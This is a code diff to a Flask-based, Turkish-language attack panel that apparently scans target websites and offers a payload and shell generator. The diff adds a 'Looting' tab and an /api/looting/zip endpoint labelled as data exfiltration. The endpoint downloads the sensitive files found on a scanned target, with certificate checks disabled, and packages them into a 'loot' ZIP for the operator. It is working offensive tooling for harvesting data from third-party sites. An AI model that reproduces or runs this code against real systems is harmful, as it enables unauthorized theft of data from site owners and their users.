@@ -8,6 +8,7 @@ import threading
 import subprocess
 import re
 import csv
+import zipfile
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from bs4 import BeautifulSoup
 from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
@@ -69,7 +70,7 @@ LOGIN_TEMPLATE = """
 </html>
 """
 
-# --- ANA KONTROL PANELİ HTML ŞABLONU (Yeniden Tarama Desteğiyle) ---
+# --- ANA KONTROL PANELİ HTML ŞABLONU (Looting Sekmesi Eklendi) ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -90,7 +91,7 @@ HTML_TEMPLATE = """
         .tab-content { display: none; }
         .tab-content.active { display: block; }
         .form-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
-        input[type="text"], textarea { padding: 14px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 15px; }
+        input[type="text"], select, textarea { padding: 14px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 15px; }
         textarea { resize: vertical; height: 110px; font-family: monospace; }
         button { padding: 14px 24px; background: #0284c7; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; transition: 0.2s; font-weight: bold; }
         button:hover { background: #0369a1; }
@@ -123,9 +124,10 @@ HTML_TEMPLATE = """
         </div>
         
         <div class="tabs">
-            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Canlı Keşif & API Testleri</button>
-            <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payload & Shell Üreticisi</button>
-            <button class="tab-btn" onclick="switchTab('dataTab')" id="dataTabBtn">📁 Site Verileri & Risk Grafikleri</button>
+            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Canlı Keşif & API</button>
+            <button class="tab-btn" onclick="switchTab('lootingTab')" id="lootingTabBtn">🏴‍☠️ Looting & Veri Çek</button>
+            <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payload Üretici</button>
+            <button class="tab-btn" onclick="switchTab('dataTab')" id="dataTabBtn">📁 Site Verileri & Grafik</button>
         </div>
 
         <!-- Canlı Tarama Sekmesi -->
@@ -158,6 +160,21 @@ HTML_TEMPLATE = """
             </div>
 
             <div id="results" class="terminal" style="display:none;"></div>
+        </div>
+
+        <!-- Looting & Veri Çekme Sekmesi -->
+        <div id="lootingTab" class="tab-content">
+            <h3>🏴‍☠️ Otomatik Veri Yağmalama (Data Exfiltration & ZIP İndir)</h3>
+            <p style="color: #94a3b8; font-size: 13px;">Taraması yapılmış ve hassas dosyaları yakalanmış hedeflerin verilerini tek tıkla ZIP olarak bilgisayarına indir.</p>
+            
+            <div class="form-group">
+                <label><b>Arşivdeki Hedef Siteyi Seç:</b></label>
+                <select id="lootingTargetSelect">
+                    <option value="">Önce bir tarama yapın veya arşivden seçin...</option>
+                </select>
+            </div>
+            
+            <button class="success" onclick="downloadLootZip()" style="font-size: 16px;">📦 Seçilen Hedefin Tüm Verilerini ZIP Olarak İndir</button>
         </div>
 
         <!-- Payload & Shell Üreticisi Sekmesi -->
@@ -248,7 +265,7 @@ HTML_TEMPLATE = """
             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
             document.getElementById(tabId).classList.add('active');
             event.target.classList.add('active');
-            if(tabId === 'dataTab') { loadSiteDatabase(); }
+            if(tabId === 'dataTab' || tabId === 'lootingTab') { loadSiteDatabase(); }
         }
 
         async function startScan(targetOverride = false) {
@@ -263,7 +280,7 @@ HTML_TEMPLATE = """
                 document.getElementById('targetUrl').value = url;
                 switchTab('scanTab');
                 document.querySelectorAll('.tab-btn')[0].classList.add('active');
-                document.querySelectorAll('.tab-btn')[2].classList.remove('active');
+                document.querySelectorAll('.tab-btn')[3].classList.remove('active');
             }
 
             lastTarget = url;
@@ -294,11 +311,20 @@ HTML_TEMPLATE = """
             const res = await fetch('/api/all-data');
             const data = await res.json();
             const container = document.getElementById('databaseTableContainer');
+            const selectDropdown = document.getElementById('lootingTargetSelect');
             
             if(data.database.length === 0) {
                 container.innerHTML = "<p style='color: #94a3b8;'>Veritabanında kayıtlı veri bulunmuyor.</p>";
+                selectDropdown.innerHTML = '<option value="">Önce bir tarama yapın veya arşivden seçin...</option>';
                 return;
             }
+
+            // Looting dropdown güncelle
+            let selectHtml = '<option value="">Hedef seçin...</option>';
+            data.database.forEach(item => {
+                selectHtml += `<option value="${item.target}">${item.target} (${item.files.length} Dosya)</option>`;
+            });
+            selectDropdown.innerHTML = selectHtml;
 
             let grades = {};
             let wafs = {};
@@ -343,6 +369,12 @@ HTML_TEMPLATE = """
             });
             html += `</tbody></table>`;
             container.innerHTML = html;
+        }
+
+        function downloadLootZip() {
+            const target = document.getElementById('lootingTargetSelect').value;
+            if(!target) { alert('Lütfen listeden bir hedef seçin!'); return; }
+            window.open(`/api/looting/zip?target=${encodeURIComponent(target)}`, '_blank');
         }
 
         function renderCharts(grades, wafs) {
@@ -471,6 +503,38 @@ def export_csv():
     for item in SITE_DATABASE:
         writer.writerow([item['time'], item['target'], item['waf'], item['grade'], len(item['files'])])
     return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=red_team_archive.csv"})
+
+@app.route("/api/looting/zip")
+def api_looting_zip():
+    if not session.get("logged_in"): return "Unauthorized", 401
+    target = request.args.get("target", "")
+    record = next((item for item in SITE_DATABASE if item["target"] == target), None)
+    
+    memory_file = io.BytesIO()
+    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
+        # Raporu ekle
+        if record:
+            zf.writestr("recon_report.txt", record["full_report"])
+            # Yakalanan dosyaları indirip zip içine at
+            for f_url in record["files"]:
+                if f_url.startswith("http"):
+                    try:
+                        r = requests.get(f_url, timeout=4, verify=False)
+                        if r.status_code == 200:
+                            file_name = f_url.split("/")[-1] or "index.html"
+                            zf.writestr(f"harvested_files/{file_name}", r.text)
+                    except: pass
+        else:
+            zf.writestr("info.txt", f"No record found for target: {target}")
+            
+    memory_file.seek(0)
+    safe_name = urllib.parse.urlparse(target).netloc or target
+    return send_file(
+        memory_file,
+        mimetype='application/zip',
+        as_attachment=True,
+        download_name=f'loot_{safe_name}.zip'
+    )
 
 @app.route("/api/view-file")
 def api_view_file():
